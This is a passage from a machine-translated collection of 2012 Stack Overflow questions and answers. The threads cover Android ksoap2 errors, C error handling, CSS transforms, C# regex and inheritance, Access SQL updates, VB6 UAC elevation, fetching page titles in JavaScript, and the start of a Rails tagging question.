10-10 13:14:06.920: E/AndroidRuntime(279):  at java.lang.reflect.Method.invoke(Method.java:521)
10-10 13:14:06.920: E/AndroidRuntime(279):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
10-10 13:14:06.920: E/AndroidRuntime(279):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
10-10 13:14:06.920: E/AndroidRuntime(279):  at dalvik.system.NativeStart.main(Native Method)
 10-10 13:14:11.240: I/Process(279): Sending signal. PID: 279 SIG: 9 
```

任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:37:36.860

你做完了吗

Project > Properties > Java Build Path > Order and Export > 最后，勾选您导入的 KSOAP2 库。

另外，不要在 UI 线程上使用 web 服务，考虑使用服务或[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:58:12.290

在 Android 中使用`ksoap2`有时会很有挑战性。正如 ThePCWizard 正确建议的那样，最好使用`AsyncTask`.

你得到一个`java.lang.NoClassDefFoundError`可能表明`ksoap.jar`你的 Android 项目无法识别的。

Assuming you have the latest `ADT version` installed, you need to add the `.jar` file in the `libs` folder of your Android project. After that right click the `.jar` file **-->Build path-->Add to build path**.

Clean your project and try running the application. It should remove the class definition not found error.

I had implemented a similar application quite some time back. Here is the [link](https://stackoverflow.com/questions/7860887/how-to-call-a-local-web-service-from-an-android-mobile-application).

Hope it helps!

# c - 处理函数错误消息的最理想方式？

> ID：12820382
> 
> 赞同：3
> 
> 时间：2012-10-10T13:22:02.807
> 
> 标签：c, function, error-handling, return-value, stderr

假设我有一个功能可以执行一个很小的特定任务，该任务很有可能失败。处理出错的最佳方法是什么？（假设我知道问题是什么）。

例如，假设我有一个读取两个字节字符串并返回它的函数：

```
#include <stdio.h>
#include <stdlib.h>

char *bar(void)
{
    char *foo = malloc(3);
    scanf("%2s", foo);
    return foo;
}

int main(void)
{
    char *foo = bar();
    puts(foo);
    free(foo);
    return 0;
} 
```

上面的示例绝对没有任何错误处理。有两种方法可以实现某种错误处理，但我不确定哪种方法更受欢迎或被认为是最佳实践。

方法 1（从函数内部将错误消息打印到 stderr）：

```
#include <stdio.h>
#include <stdlib.h>

char *bar(void)
{
    char *foo;
    if(!(foo = malloc(3)))
    {
        fputs("\nError! Memory allocation failed.", stderr);
        return 0x00;
    }
    scanf("%2s", foo);
    return foo;
}

int main(void)
{
    char *foo;
    if(!(foo = bar())) return 1;
    puts(foo);
    free(foo);
    return 0;
} 
```

方法2（从调用函数打印错误信息到stderr）：

```
#include <stdio.h>
#include <stdlib.h>

char *bar(void)
{
    char *foo;
    if(!(foo = malloc(3))) return 0x00;
    scanf("%2s", foo);
    return foo;
}

int main(void)
{
    char *foo;
    if(!(foo = bar()))
    {
        fputs("\nError! Memory allocation failed.", stderr); 
        return 1;
    }
    puts(foo);
    free(foo);
    return 0;
} 
```

我几乎认为方法二将是最好的方法，因为这样我可以更具体地了解我的错误消息，具体取决于我当时调用该函数的目的。对于方法二，我担心的是，如果函数有多个潜在故障点，我将无法打印函数中具体出了什么问题。

伪代码：

```
 IF FAILUREA
     PRINT "FAILUREA OCCURED"
     RETURN
 IF FAILUREB
     PRINT  "FAILUREB OCCURED"
     RETURN 
```

如果我调用的函数是 an，这不会有太大问题，`int`因为那时我可以根据错误返回一个不同的整数值。但是在 a 的情况下，`char*`我通常会尝试`NULL`在失败时返回（所以两者`FAILUREA`都会`FAILUREB`返回`NULL`）；没有办法知道导致该功能失败的原因。

所以我的问题是处理错误消息时的最佳实践是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:41:29.743

允许调用者处理错误报告会更好，因为：

*   如果该功能构成库的一部分，`stderr`则可能不可用，并且需要替代报告机制。
*   调用代码可能具有可以采取的替代操作，并且可能不会将功能失败`bar()`视为实际失败并且不需要报告它。

如果一个函数有多个可能的失败原因，那么可以将一个参数传递给在失败时更新的函数。然后调用函数可以根据实际失败原因选择适当的操作。例如：

```
enum Status
{
    STATUS_OK,
    STATUS_MEMORY_ALLOCATION_FAILURE,
    STATUS_ACCESS_DENIED
};

enum Status status;
char* foo = bar(&status);
if (!foo)
{
    if (STATUS_MEMORY_ALLOCATION_FAILURE == status)
    {
        /* report failure. */
    }
    else if (STATUS_ACCESS_DENIED == status)
    {
        /* try somewhere else */
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:56:50.267

如果你能对失败做任何事情，如果你打算这样做，那么你就去做。否则，你可以实现一个通用的失败函数，在出错的情况下调用它，然后每天调用它：

```
void error(const char* format, ...)
{
  va_list vl;
  va_start(vl, format);
  vfprintf(stderr, format, vl);
  va_end(vl);
  exit(-1);
} 
```

您可以选择将其包装在一个宏中，并为其提供行号和文件名：

```
#define ERROR(fmt, ...) \
  error("file:'%s',line:%d " fmt, __FILE__, __LINE__, __VA_ARGS__) 
```

这将使控制台中的错误非常容易找出，因为错误消息准确地告诉了文件和其中发生错误的行。

典型用法，没什么花哨的：

```
char *bar(void)
{
  char *foo;
  if ((foo=malloc(3)) == NULL)
    ERROR("malloc() failed!\n");
  if (scanf("%2s", foo) != 1)
    ERROR("scanf() failed!\n");
  return foo;
} 
```

如果您想在错误发生时实际执行某些操作，您可以使用`longjmp()`代替`exit(-1)`立即返回调用者（=执行相应操作的调用者），可能会关闭所有打开的文件以进行写入，这样缓冲的数据就不会丢失。`setjmp()`

例如，如果您正在编写一个简单的编译器，对于编译`error()`器内部的大多数错误以及正在编译的源代码中的问题（例如缺少冒号/括号或其他导致代码不可编译）。

如果您不能或不想这样做，则需要仔细编写代码，进行适当的清理并返回不同的错误代码以将可操作的错误传达给调用者。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:51:53.953

如果您的函数返回超过 1 个错误情况，您可以这样做

```
#include <stdio.h>
#include <stdlib.h>

int bar(char **foo)
{
    if(!(malloc(3))) return 1; /* return error case 1*/
    scanf("%2s", *foo);
    if(!(malloc(4))) return 2; /* return error case 2*/
    return 0; /* no error*/
}

int catcherror(int error)
{
    switch (error) {
         case 1: 
             /*do something 1*/
         case 2: 
             /*do something 1*/
         case 3: 
             /*do something 1*/
         case 4: 
             /*do something 1*/
         case 5: 
             /*do something 1*/
         default: 
             /*do something 1*/
     }
}

int main(void)
{
    char *foo;
    int error

    error = bar(&foo);
    catcherror(error);
    puts(foo);
    free(foo);
    return 0;
} 
```

如果您的项目包含许多返回常见错误情况的函数，该`catcherror()`函数可能非常有用

# spring - App Engine + Spring 是否有 Maven 原型

> ID：12820385
> 
> 赞同：1
> 
> 时间：2012-10-10T13:22:16.277
> 
> 标签：spring, google-app-engine, gwt, maven

是否有任何 Maven 原型用于：

*   GWT + 弹簧
*   春天+应用引擎
*   GWT + Spring + AppEngine

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:33:15.547

我为你做了谷歌搜索，发现：

*   [gwt-spring-archetype](http://code.google.com/p/gwt-spring-archetype/)
*   [gae-mvn-archetype](http://code.google.com/p/gae-mvn-archetype/) -GAE/J 项目的 Maven 原型
*   [gae-archetype-gwt](https://github.com/maven-gae-plugin/maven-gae-plugin) - 基于 GWT 的示例

# matlab - matlab中的大数据文件不加载/导入

> ID：12820386
> 
> 赞同：2
> 
> 时间：2012-10-10T13:22:23.297
> 
> 标签：matlab, memory, bigdata

我一直在尝试将数据文件（csv）加载到在 win7（64 位）上运行的 matlab 64 位中，但出现与内存相关的错误。文件大小约为 3 GB，第一列包含日期 (dd/mm/yyyy hh:mm:ss)，另外两列包含买卖价格。内存命令返回以下内容：

```
 Maximum possible array:              19629 MB (2.058e+010 bytes) *
  Memory available for all arrays:     19629 MB (2.058e+010 bytes) *
  Memory used by MATLAB:                 522 MB (5.475e+008 bytes)
  Physical Memory (RAM):               16367 MB (1.716e+010 bytes)

*  Limited by System Memory (physical + swap file) available. 
```

有人可以在这里解释一下最大可能的数组大小是否为 19.6 GB，那么为什么 matlab 在导入大约 3GB 的数据数组时会抛出内存错误。如果这对经验丰富的人来说是一个简单的问题，我深表歉意，因为我在进程/应用程序内存管理方面几乎没有经验。

如果有人还建议能够将此数据集加载到 matlab 工作区中的解决方案，我将不胜感激。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:33:07.860

我不是内存管理方面的专家，但根据经验，我可以告诉您，如果您正在导入/导出 3GB 文本文件，您会遇到各种问题。

我会在您阅读数据之前使用外部工具拆分数据，或者考虑以更适合大型数据集的另一种格式存储该数据。就我个人而言，我过去曾使用`hdf5`过——这是为大型数据集设计的，也受`matlab`.

与此同时，这些链接可能会有所帮助：

[在 MATLAB 中处理一个大的 CSV 文件](https://stackoverflow.com/questions/5702872/working-with-a-big-csv-file-in-matlab?rq=1)

[在 MATLAB 中高效处理大型数据集](http://www.mathworks.com/matlabcentral/fileexchange/9060)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:37:20.607

在展示如何在 matlab 中读取巨大的文本文件[之前](https://stackoverflow.com/a/10655798/271811)，我已经发布过。`memmapfile()`这种技术也可以帮助你。

# ios - Facebook like Button 与用户认证

> ID：12820387
> 
> 赞同：0
> 
> 时间：2012-10-10T13:22:24.160
> 
> 标签：ios, facebook, facebook-like

我正在开发一个 ipad 应用程序，因为我需要包含类似按钮的 facebook 页面。我已经使用 iframe 加载了按钮`webview`，当用户单击按钮时，如果他们已经叹了气，那么计数应该增加或减少，否则弹出窗口会要求他们先登录。一旦他们登录，然后自动增加计数。
任何代码示例一步一步地做。

这是我`webview`喜欢的按钮代码

```
NSString *likeButtonIframe = @"<iframe src='http://www.facebook.com/plugins/likebox.php?id=XXXXXXXXXXXXXXX&amp;width=292&amp;connections=0&amp;stream=false&amp;header=false&amp;height=62' scrolling='no' frameborder=0' style='border:none; overflow:hidden; width:282px; height:62px;' allowTransparency='true'></iframe>";

NSString *likeButtonHtml = [NSString stringWithFormat:@"<HTML><BODY>%@</BODY></HTML>", likeButtonIframe];
[_webView loadHTMLString:likeButtonHtml baseURL:[NSURL URLWithString:@""]]; 
```

我也尝试过之前的节目，比如我会先让他登录，然后显示点赞按钮并让他们点赞。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-20T08:34:05.570

我使用了 UIWebView 的委托方法

```
-(BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType 
```

检测用户何时没有活动会话。这是我的示例代码：[https ://github.com/gneil90/facebook-likebox-ios-login](https://github.com/gneil90/facebook-likebox-ios-login)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T16:52:44.717

根据 Facebook，你不应该在应用程序中有一个喜欢的按钮，这是为了避免垃圾邮件喜欢。

即使我们可以使用 iFrame & 来实现它`UIWebView`。

RayWinderlich 为 iOS 应用程序中的 Facebook Like Button 提供了一个很棒的[教程](http://www.raywenderlich.com/1626/how-to-post-to-a-users-wall-upload-photos-and-add-a-like-button-from-your-iphone-app)。

[按照此链接](https://developers.facebook.com/docs/reference/plugins/like-box/)为您的页面生成 Facebook 类似框架。

并在您的应用程序中相应地使用，一个限制是，如果用户未登录，它会在其中显示登录屏幕。因此，如果您的 webView 很小，那将是一个问题。查看教程中的示例，并根据您的要求实施。

# html - css3变换旋转90度不起作用

> ID：12820388
> 
> 赞同：2
> 
> 时间：2012-10-10T13:22:26.623
> 
> 标签：html, css

**问题：**

每个“li”标签不是一个一个出现（从左上角固定）。相反，它从左到右流动......

**我的 HTML 是：**

```
<div class="fixed-button">
    <ul>
        <li><a href="#" title="">Contact Us</a></li>
        <li><a href="#" title="">nh;kjfwae ilfmnsdkl;</a></li>
    </ul>
</div> 
```

**而 CSS 是：**

```
div.fixed-button{
    position: absolute;
    display: block!important;
    width: 0;
    height: 0;
    z-index: 90000;
    margin: 0;
    outline: 0;
    top: 200px;
}
div.fixed-button a{
    background: url("images/fix-bug-repeat.png") repeat 0 0;
    margin-left: -33px;
    height: auto;
    padding: 10px 14px;
    font: bold 13px/16px arial, sans-serif;
    color: white;
    text-align: center;
    -moz-transform: scale(1) rotate(90deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg);
    -webkit-transform: scale(1) rotate(90deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg);
    -o-transform: scale(1) rotate(90deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg);
    -ms-transform: scale(1) rotate(90deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg);
    transform: scale(1) rotate(90deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg);
    white-space: nowrap;
    position: absolute;
    left: 0;
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=3);
    border-bottom-width: 0;        
    margin-bottom: 20px;
    text-decoration: none;
} 
```

我尝试了所有可能的方法。但不工作。请修复此错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:24:06.920

您正在对错误的元素应用变换。而不是将其应用于每个`<a>`标签，而是将其应用于`<ul>`整个标签。

为了使链接即使在水平情况下也能并排显示[在没有转换的情况下正常读取]，我们`float: left;`在`<li>`标签上使用。

这是完整的代码：

```
<div class="fixed-button">
    <ul>
        <li><a href="#" title="">Contact Us</a></li>
        <li><a href="#" title="">Shubhanshu Mishra</a></li>
        <li><a href="#" title="">SmexyyWeby</a></li>
        <li><a href="#" title="">SmexyyWeby</a></li>
    </ul>
</div>​ 
```

我刚刚添加了 webkit 转换，您可以为同一标签中的其他元素添加转换。

此外，您的`<a>`标签具有`position:absolute;`应删除以使链接正确显示的属性。

这是我使用的最终 CSS：

```
div.fixed-button{
 position: absolute;
 display: block!important;
 z-index: 90000;
 margin: 0;
 outline: 0;
 top: 200px;
}

.fixed-button ul{
    -webkit-transform: scale(1) rotate(90deg) translate(0px, 0px);
    margin-left: 50px;
    -webkit-transform-origin: 0% 0 0;
}

div.fixed-button a {
    background-color: black;
    height: auto;
    padding: 10px 14px;
    font: bold 13px/16px arial, sans-serif;
    color: white;
    text-align: center;
    white-space: nowrap;
    text-decoration: none;
}

li{
    float: left;
}​ 
```

**120px** in应根据`-webkit-transform: translate(0px, 120px)`您的 css 需要设置，因为它会针对不同的布局进行更改并水平转换列表。

**更新：**我已经通过使用`-webkit-transform-origin`属性更新了代码，这将允许您设置旋转元素的原点并设置`margin-left`正确放置的位置。它对任意数量的`<li>`元素都有效。您可以在下面的链接中查看新代码。

请检查工作代码：http: [//jsfiddle.net/shubhanshumishra/qhS6r/](http://jsfiddle.net/shubhanshumishra/qhS6r/)

# c# - 排除除某些单词之外的所有单词的正则表达式

> ID：12820393
> 
> 赞同：2
> 
> 时间：2012-10-10T13:22:36.193
> 
> 标签：c#, regex

我虽然过滤一个像 : 这样的字符串 `"Hello <strong>plip</strong> plop"` 来获得 `"plip plop"`，也就是说，排除除 'plip' 和 'plop' 之外的所有单词会很容易使用这个 C# 行： `new Regex("[^(plip)(plop)]").Replace(inputString,"")`。不幸的是，排除括号`[^]`似乎不接受排除词，因为它使每个字母都包含在 'plip' 和 'plop' 中（结果是`"llooplipoplop"`）。

有没有办法在单个正则表达式/行中实现这一点，或者是否有必要循环其他所有的 plip 和 plop 匹配，然后连接它们？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:34:52.613

希望这有效

```
(?<=(\bplip\b|\bplop\b|^)).*?(?=(\bplip\b|\bplop\b|$)) 
```

您应该设置`singleline`上述正则表达式的工作模式

在[这里工作](http://regexhero.net/tester/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-10T13:36:48.853

一般来说，编写一个匹配你想要的东西的正则表达式比一个匹配所有你不想要的东西的正则表达式要容易得多。

在这种情况下，您想“排除除`plip`and之外的所有单词`plop`”，但为什么不只包含`plip`and`plop`呢？

```
var input = "Hello <strong>plip</strong> plop";
var matches = Regex.Matches(input, "plip|plop");
var result = string.Join("", matches.Cast<Match>().Select(x => x.Value));

Console.Out.WriteLine(result); // prints "plipplop" 
```

当然，既然你要求一个单行，你可以在没有临时变量的情况下做任何事情（祝下一个阅读代码的人好运！）：

```
var result = string.Join("", Regex.Matches("Hello <strong>plip</strong> plop", "plip|plop").Cast<Match>().Select(x => x.Value)); 
```

此外，假设您的实际单词列表比`plip`and更复杂`plop`，您可以执行类似`var pattern = string.Join("|", words);`构建模式的操作。

# vba - 从 Shell 调用可执行文件的默认用户权限

> ID：12820394
> 
> 赞同：1
> 
> 时间：2012-10-10T13:22:36.947
> 
> 标签：vba, windows-7, vb6, uac

所以，我必须修复这个 VB6 应用程序`A`，它`B.exe`通过 Shell 命令 ( `Shell(strCmd)`)`C.exe args`及其参数启动。`B.exe`将作为`C.exe`其`args`参数启动。

此 VB6 应用程序可在具有最低 UAC 设置的 Windows XP 和 Windows 7 下运行。但是，在具有默认 UAC 设置的 Windows 7 下（从最高的第二个缺口），`C.exe`会产生错误。当我在`C.exe`没有提升权限的情况下运行时，我得到了同样的错误。

我的问题是：

如果我`A`以管理员身份`B.exe`运行，如果通过 Shell 命令执行，是否以管理员身份运行`A`？

如果没有，在不更改`B.exe`and的情况下我有哪些选择`C.exe`？如果可能，在运行时不提示用户输入密码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:58:41.590

`Shell()`不会更改特权或执行级别。如果可执行文件正在运行提升，那么任何子进程也将被提升。

如果要运行从未提升的进程提升的进程，则需要使用`ShellExecute()`动词`runas`。

不可能（直接）启动一个从提升的过程中不提升的过程。

# php - 在 Windows 上为要在 PHP 中使用的 C++ 静态库创建 .so 文件

> ID：12820396
> 
> 赞同：1
> 
> 时间：2012-10-10T13:22:43.270
> 
> 标签：php, c++, windows, eclipse, makefile

实际上，我们需要在 PHP 中使用 C++ 静态库，为此我们需要创建 .so 。具体来说，我们正在 Windows 平台上工作，因此 make / ./configure 等在此处无法用于制作 php 扩展，或者我们无法弄清楚。

有关在 Windows 上为 C++ 静态库创建“.so”文件或在 Windows 上为 C++ 静态库创建和配置文件的步骤的任何帮助。

提前致谢....

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:28:27.523

扩展名为 .so 的文件*通常是* [基于 unix 的动态库](http://en.wikipedia.org/wiki/Library_%28computing%29#File_naming)。
Windows 中的等价物*通常*是 .dll 文件。
对于 PHP 扩展，阅读[手册可能是个好主意](http://php.net/manual/en/install.pecl.windows.php)

相关问题：
[c++ php 和静态库](https://stackoverflow.com/questions/7244482/c-php-and-static-library)
[用 C++ 扩展 PHP？](https://stackoverflow.com/questions/1110682/extending-php-with-c)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:29:15.250

你在 Windows 环境中使用 dll

```
 LoadModule php5_module "c:/wamp/bin/php/php5.3.5/php5apache2_2.dll" 
```

作为 httpd.conf 中的示例或

```
 extension=php_gd2.dll 
```

在 PHP.ini 中。如果您需要在 unix 环境中使用 gcc 重新编译代码

# sql - 用于更新库存水平的 SQL

> ID：12820399
> 
> 赞同：1
> 
> 时间：2012-10-10T13:22:58.620
> 
> 标签：sql, database, ms-access

运行以下代码时出现此错误：

![错误](../Images/9147e952d16c2d347c6b3913900e2d03.png)

```
Dim sqlSCIQty As String
Dim sqlSCQty As String

sqlSCIQty = "UPDATE [products/stock] INNER JOIN [Stock Conversion Items] " & _
"ON [products/stock].[Product Code] = [Stock Conversion Items].[Result PC] " & _
"SET [Stock Level] = ([Stock Level] + [Quantity]) " & _
"WHERE [Stock Conversion Items].[CutID] = " & Me.txtPCutID.Value & ";"

sqlSCQty = "UPDATE [products/stock] INNER JOIN [Stock Conversion] " & _
"ON [products/stock].[Product Code] = [Stock Conversion].[Source PC] " & _
"INNER JOIN [Stock Conversion Items] " & _
"ON [Stock Conversion].[SCID] = [Stock Conversion Items].[SCID] " & _
"SET [Stock Level] = ([Stock Level] - [Stock Conversion].[Quantity]) " & _
"WHERE [Stock Conversion Items].[CutID] = " & Me.txtPCutID.Value & ";"

Set db = CurrentDb
db.Execute sqlSCIQty, dbFailOnError
db.Execute sqlSCQty, dbFailOnError
Set db = Nothing 
```

我知道第一个语句可以正常运行，但是第二个语句会抛出该错误，我不熟悉如此复杂的更新语句，所以任何有 SQL 知识的人都可以发现任何东西吗？

在此先感谢，
鲍勃 P

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:31:38.027

你可以试试这样

```
sqlSCQty = "UPDATE (([products/stock] INNER JOIN [Stock Conversion] " & _
"ON [products/stock].[Product Code] = [Stock Conversion].[Source PC]) " & _
"INNER JOIN [Stock Conversion Items] " & _
"ON [Stock Conversion].[SCID] = [Stock Conversion Items].[SCID]) " & _
"SET [Stock Level] = ([Stock Level] - [Stock Conversion].[Quantity]) " & _
"WHERE [Stock Conversion Items].[CutID] = " & Me.txtPCutID.Value & ";" 
```

当您有超过 1 个加入时，您需要括号`ms-access`

# javascript - 获取带有链接的页面标题

> ID：12820401
> 
> 赞同：0
> 
> 时间：2012-10-10T13:23:02.983
> 
> 标签：javascript, jquery, page-title

我在texbox中有一个链接。当我单击一个按钮时，我想获取链接页面的标题。如何用 javascript 或 jQuery 做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:28:16.703

这篇文章可以让你开始

[http://forum.jquery.com/topic/get-external-page-and-fetch-title-googled-a-lot-didn-t-find-any-solution](http://forum.jquery.com/topic/get-external-page-and-fetch-title-googled-a-lot-didn-t-find-any-solution)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:30:10.150

它几乎总是由后端脚本/爬虫完成。它在服务器端为您获取网页并通过 AJAX 返回解析的数据

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:28:36.803

如果页面在同一个域中，我会说使用 ajax 请求并从返回的 DOM 对象中获取标题。

如果它是不同的域，我会说将隐藏的 IFrame 设置为该位置，并在加载时使用以下内容获取标题：

```
document.getElementById('MyIframe').document.title 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:44:39.603

尝试这样的事情

```
<a href="http://www.google.com" id="googleLink">Google</a>
<span id="titleGoesHere"></span> 
```

--

```
$(document).ready( function() {
    $('#googleLink').click(function(){
        $.get(this.prop('href'), function(data) {
            var $temp = $('<div id="tempData" />');
            $temp.append(data);
            var title = $('title', $temp);
            $('#titleGoesHere').html(title.val());
        });
    });
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-07-16T09:00:18.170

> 出于安全原因，浏览器会限制从脚本中发起的跨域 HTTP 请求。由于我们在前端使用客户端 Javascript 进行网页抓取，因此可能会出现 CORS 错误。
> 
> ...
> 
> 牢牢地保留在我们的前端脚本中，我们可以使用跨域工具，例如 Any Origin、Whatever Origin、All Origins、crossorigin 等等。我发现您经常需要测试其中的一些才能找到可以在您尝试抓取的网站上运行的那个。

从[这篇文章](https://medium.freecodecamp.org/client-side-web-scraping-with-javascript-using-jquery-and-regex-5b57a271cb86)中，我写了这个**工作和独立的**小提琴：

```
function replaceAll(str, find, replace) {
    return str.replace(new RegExp(find, 'g'), replace);
}

const url = "https://www.facebook.com/"

$.getJSON('https://allorigins.me/get?url=' + encodeURIComponent(url) + '&callback=?', function(data){
    const content = replaceAll(data.contents, "<script", "<meta");
    $("#content").append(content);
    const d = $("#content");
    $('#title').text(d.find('title').text());
  $('#description').text(d.find('meta[name=description]').attr("content") || "None");
});
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>

<div id="content" style="display: none;">
</div>

<h3 id="title">Waiting...</h3>

<br/>

<p id="description">Waiting...</p>
```

* * *

几点评论：

*   通过https使用跨域工具
*   不要忘记`encodeURIComponent`你的网址
*   我用`script`标签替换了标签，`meta`以便在附加到 DOM 时不执行任何标签（replace function from this [question](https://stackoverflow.com/questions/1144783/how-to-replace-all-occurrences-of-a-string-in-javascript)）
*   要使用，必须将解析后的 jQuery 添加到 dom 中（请参阅[此问题](https://stackoverflow.com/questions/12808770/parsing-of-html-string-using-jquery)）

# youtube-api - Youtube api，已删除的视频未包含在用户最喜欢的播放列表中，存在重复问题

> ID：12820403
> 
> 赞同：2
> 
> 时间：2012-10-10T13:23:08.063
> 
> 标签：youtube-api, playlist, favorite

我在检索用户最喜欢的播放列表时遇到问题。

场景：我直接在 youtube 上打开了一些用户的收藏夹（即 youtube.com/playlist?list=FL...）。现在，如果该列表已删除（或私人、排除）视频，它们也会定期显示在页面上。

但是，当我尝试通过 api（即 gdata.youtube.com/feeds/api/users/.../favorites?v=2&start-index=1&safeSearch=none&alt=json）接收列表时，这些视频不包含在响应（在我的情况下为 json）。我使用 safesearch=none 参数来“强制”包含按本地化排除的视频（因为这些也会导致问题）。也没有任何提示，根本没有视频。现在，当通过 start-index 加载下一部分时，这给我带来了问题。

当有不可用/已删除的视频时，结果只是一个上移可用视频的列表。现在，当我尝试加载下一部分（例如 start-index=26）时，我会从前一个（1-25）结果中获得重复视频的列表。列表开头的重复项与先前请求中删除的视频一样多。

我认为 api 在使用 start-index 时不会考虑已删除的视频。这是一个错误吗？结果中也没有新的“更正”索引，我可以用来加载下一部分。

到目前为止，我在我测试过的普通播放列表上没有遇到这个错误，所以这可能只对收藏夹有效。例如，您可以使用频道“HouseElectroBootleg”来重现此效果，只需查看原始收藏夹即可：

youtube.com/playlist?list=FLUb8dHB7cvFY-Ez8SmRYWgA

然后通过 api 1-25（缺少已删除的）：

gdata.youtube.com/feeds/api/users/HouseElectroBootleg/favorites?start-index=1&safeSearch=none&alt=json&v=2

现在是错误的结果（从索引 26 开始）：

gdata.youtube.com/feeds/api/users/HouseElectroBootleg/favorites?start-index=26&safeSearch=none&alt=json&v=2

我怎样才能获得正确的索引值或只是不工作视频的计数，所以我可以将数字添加到偏移量来纠正它？

谢谢你，对不起我的英语不好，我试图尽可能好地描述我的问题。

# c# - 在 C# 中覆盖基本受保护的属性

> ID：12820411
> 
> 赞同：0
> 
> 时间：2012-10-10T13:23:39.060
> 
> 标签：c#, oop, inheritance

轻微的新手问题。

我有一个付款基类。除了额外的附加功能外，所有这些都具有相同的属性。其中一个属性是 a `postUrl`。在基类中，这是空的，但在子类中，每个类都有自己的 url。这不应该被允许从类外部访问，它是固定的，不应该改变。我如何去覆盖子类中的属性？

例如

```
class paymentBase
{
    public int transactionId {get;set;}
    public string item {get;set;}
    protected virtual postUrl = String.empty; // can't be accessed from outside inheritance / public / protected?

    public void payme();
}

class paymentGateWayNamePayment : paymentBase
{
    protected override postUrl { 
        get { return "http://myurl.com/payme"; }
    }
} 
```

我该怎么做呢？

提前致谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-10T13:30:50.050

`postUrl`如果您将自己的虚拟财产设为实际，您应该能够完成它，如下所示：

```
class paymentBase
{
    public int transactionId {get;set;}
    public string item {get;set;}
    protected virtual postUrl { get { return String.Empty; }}

    public void payme();
}

class paymentGateWayNamePayment : paymentBase
{
    protected override postUrl {get { return "http://myurl.com/payme"; } }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:50:43.027

根据您的要求，我建议使用接口，因为 posturl 是一个通用属性，可用于任何内容，例如页面回发、控件回发、您的类可能使用它等。任何人都可以根据需要使用此接口班级。

```
interface IPostUrl
{
    string postUrl { get; }
}

class paymentBase
{
    public int transactionId {get;set;}
    public string item {get;set;}
    public void payme(){}
}

class paymentGateWayNamePayment : paymentBase, IPostUrl
{
    public string postUrl
    {
        get { return "http://myurl.com/payme"; }
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-29T21:09:35.213

我知道这是一个较晚的条目，但是如果您希望 postUrl 值由子类设置一次，然后再也不需要将其设置为基类的私有值。

```
abstract class paymentBase
{
    public paymentBase(string postUrl) { this.postUrl = postUrl; }
    public int transactionId { get; set; }
    public string item { get; set; }
    protected string postUrl { get; private set; }

    public void payme();
}

class paymentGateWayNamePayment : paymentBase
{
    public paymentGateWayNamePayment() : base("http://myurl.com/payme") {  }
}
```

# ruby-on-rails - 从头开始标记：查询数据库问题

> ID：12820413
> 
> 赞同：0
> 
> 时间：2012-10-10T13:23:41.487
> 
> 标签：ruby-on-rails, postgresql, tagging, acts-as-taggable-on, jquery-tokeninput

@saverio 成功回答了关于[从头开始标记的数据库查询问题：标签云问题](https://stackoverflow.com/questions/12806757/tagging-from-scratch-the-tag-cloud-issue/12808572)

现在我正在尝试将标记系统与 jQuery-tokenInput 连接以动态**创建**和**查找**标签，如[http://railscasts.com/episodes/258-token-fields-revised](http://railscasts.com/episodes/258-token-fields-revised)。

*   我的猜测是这是 Posgresql 数据库的查询问题。
*   我已经正确安装了 Postgresql
*   jQuery-tokenInput 在*Application.js上的位置* `//= require jquery.tokeninput`
*   不知何故，它可以从数据库中已经存在的内容中加载标签，但是它无法动态查询相同的单词，如下面的*pictures.js.coffee*代码中列出的那样。

遵循所有相关范围：

**`pictures.js.coffee`**

```
jQuery ->
  $('#picture_tag_tokens').tokenInput '/tags.json'
  theme: 'facebook'
  prePopulate: $('#picture_tag_tokens').data('load') 
```

**`/views/pictures/_form`**

```
<div class="field">
  <%= f.label :tag_tokens, "Tags (separated by commas)" %><br />
  <%= f.text_field :tag_tokens, data: {load: @picture.tags} %>
</div> 
```

在这里，我的逻辑有点迷失了

**`/models/picture.rb`**

```
class Picture < ActiveRecord::Base
  attr_accessible :description, :title, :tag_tokens
  has_many :taggings
  has_many :tags, through: :taggings
  attr_reader :tag_tokens

  #The **below** is the relevant part for the #view/pictures/_form
  def tag_tokens=(tokens)
    self.tag_ids = Tag.ids_from_tokens(tokens)
  end

  def self.tagged_with(name)
